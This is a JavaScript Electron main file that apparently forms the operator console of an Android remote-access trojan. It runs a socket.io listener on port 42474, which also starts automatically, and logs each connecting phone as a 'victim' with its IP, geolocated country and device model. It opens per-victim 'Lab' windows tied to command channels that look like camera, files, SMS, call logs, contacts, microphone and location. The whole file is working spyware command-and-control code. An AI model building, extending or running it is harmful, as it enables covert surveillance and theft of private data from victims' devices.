const { app, BrowserWindow } = require('electron')
const electron = require('electron');
const { ipcMain } = require('electron');
var io = require('socket.io');
var geoip = require('geoip-lite');
var victimsList = require('./app/assets/js/model/Victim');
module.exports = victimsList;
//--------------------------------------------------------------
let win;
let display;
var windows = {};
var IO;
//--------------------------------------------------------------

function createWindow() {

  // get Display Sizes ( x , y , width , height)
  display = electron.screen.getPrimaryDisplay();

  //------------------------SPLASH SCREEN INIT------------------------------------
  let splashWin = new BrowserWindow({
    width: 600,
    height: 400,
    frame: false,
    transparent: true,
    icon: __dirname + '/app/assets/img/icon.png',
    type: "splash",
    alwaysOnTop: true,
    show: false,
    position: "center",
    resizable: false,
    toolbar: false,
    fullscreen: false,
    webPreferences: {
      nodeIntegration: true
    }
  });

  splashWin.loadURL('file://' + __dirname + '/app/splash.html');

  splashWin.webContents.on('did-finish-load', function () {
    splashWin.show();
  });

  splashWin.on('closed', () => {
    splashWin = null
  })

  //------------------------Main SCREEN INIT------------------------------------
  win = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    width: 800,
    height: 600,
    show: false,
    resizable: false,
    position: "center",
    toolbar: false,
    fullscreen: false,
    transparent: true,
    frame: false,
    webPreferences: {
      nodeIntegration: true
    }
  });

  win.loadURL('file://' + __dirname + '/app/index.html');

  win.on('closed', () => {
    win = null
  })

  // Emitted when the window is finished loading.
  win.webContents.on('did-finish-load', function () {
    setTimeout(() => {
      splashWin.close();
      win.show();
    }, 2000);

    // AUTO-LISTEN: Wait 5s for UI to fully initialize, then start
    setTimeout(function() {
      try {
        if (!IO) {
          var autoPort = 42474;
          IO = io.listen(autoPort);
          IO.sockets.pingInterval = 10000;
          IO.sockets.on('connection', function (socket) {
            var address = socket.request.connection;
            var query = socket.handshake.query;
            var index = query.id;
            var remoteAddr = address.remoteAddress;
            var ip = remoteAddr.includes(':') ? remoteAddr.split(':').pop() : remoteAddr;
            if (ip == "1") ip = "127.0.0.1";
            var country = null;
            var geo = geoip.lookup(ip);
            if (geo) country = geo.country.toLowerCase();
            victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);

            var notification = new BrowserWindow({
              frame: false,
              x: display.bounds.width - 280,
              y: display.bounds.height - 78,
              show: false,
              width: 280,
              height: 78,
              resizable: false,
              toolbar: false,
              webPreferences: { nodeIntegration: true }
            });
            notification.webContents.on('did-finish-load', function () {
              notification.show();
              setTimeout(function () { notification.destroy() }, 3000);
            });
            notification.webContents.victim = victimsList.getVictim(index);
            notification.loadURL('file://' + __dirname + '/app/notification.html');
            win.webContents.send('SocketIO:NewVictim', index);

            socket.on('disconnect', function () {
              victimsList.rmVictim(index);
              win.webContents.send('SocketIO:RemoveVictim', index);
              if (windows[index]) {
                BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
                delete windows[index];
              }
            });
          });
          win.webContents.send('SocketIO:Listen', autoPort);
          console.log('Auto-listening on port ' + autoPort);
        }
      } catch(e) {
        console.log('Auto-listen error: ' + e.message);
      }
    }, 5000);
  });
}



// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
app.on('ready', createWindow)

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', () => {
  if (win === null) {
    createWindow()
  }
})



// fired when start listening (manual click from UI)
ipcMain.on('SocketIO:Listen', function (event, port) {
  if (IO) {
    // Already listening, don't create another
    event.sender.send('SocketIO:Listen', "Address Already in Use");
    return;
  }

  IO = io.listen(port);
  IO.sockets.pingInterval = 10000;
  IO.sockets.on('connection', function (socket) {
    var address = socket.request.connection;
    var query = socket.handshake.query;
    var index = query.id;
    var remoteAddr = address.remoteAddress;
    var ip = remoteAddr.includes(':') ? remoteAddr.split(':').pop() : remoteAddr;
    if (ip == "1") ip = "127.0.0.1";
    var country = null;
    var geo = geoip.lookup(ip);
    if (geo)
      country = geo.country.toLowerCase();

    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);

    let notification = new BrowserWindow({
      frame: false,
      x: display.bounds.width - 280,
      y: display.bounds.height - 78,
      show: false,
      width: 280,
      height: 78,
      resizable: false,
      toolbar: false,
      webPreferences: {
        nodeIntegration: true
      }
    });

    notification.webContents.on('did-finish-load', function () {
      notification.show();
      setTimeout(function () { notification.destroy() }, 3000);
    });

    notification.webContents.victim = victimsList.getVictim(index);
    notification.loadURL('file://' + __dirname + '/app/notification.html');

    win.webContents.send('SocketIO:NewVictim', index);

    socket.on('disconnect', function () {
      victimsList.rmVictim(index);
      win.webContents.send('SocketIO:RemoveVictim', index);

      if (windows[index]) {
        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
        delete windows[index]
      }
    });

  });

});


//handle the Uncaught Exceptions
process.on('uncaughtException', function (error) {
  if (error.code == "EADDRINUSE") {
    if (win) win.webContents.send('SocketIO:Listen', "Address Already in Use");
  } else {
    console.log('Uncaught error: ' + (error.message || JSON.stringify(error)));
  }
});



// Fired when Victim's Lab is opened
ipcMain.on('openLabWindow', function (e, page, index) {
  let child = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    parent: win,
    width: 600,
    height: 650,
    darkTheme: true,
    transparent: true,
    resizable: false,
    frame: false,
    webPreferences: {
      nodeIntegration: true
    }
  })

  windows[index] = child.id;

  child.webContents.victim = victimsList.getVictim(index).socket;
  child.loadURL('file://' + __dirname + '/app/' + page)

  child.once('ready-to-show', () => {
    child.show();
  });

  child.on('closed', () => {
    delete windows[index];
    if (victimsList.getVictim(index).socket) {
      victimsList.getVictim(index).socket.removeAllListeners("x0000ca");
      victimsList.getVictim(index).socket.removeAllListeners("x0000fm");
      victimsList.getVictim(index).socket.removeAllListeners("x0000sm");
      victimsList.getVictim(index).socket.removeAllListeners("x0000cl");
      victimsList.getVictim(index).socket.removeAllListeners("x0000cn");
      victimsList.getVictim(index).socket.removeAllListeners("x0000mc");
      victimsList.getVictim(index).socket.removeAllListeners("x0000lm");
    }
  })
});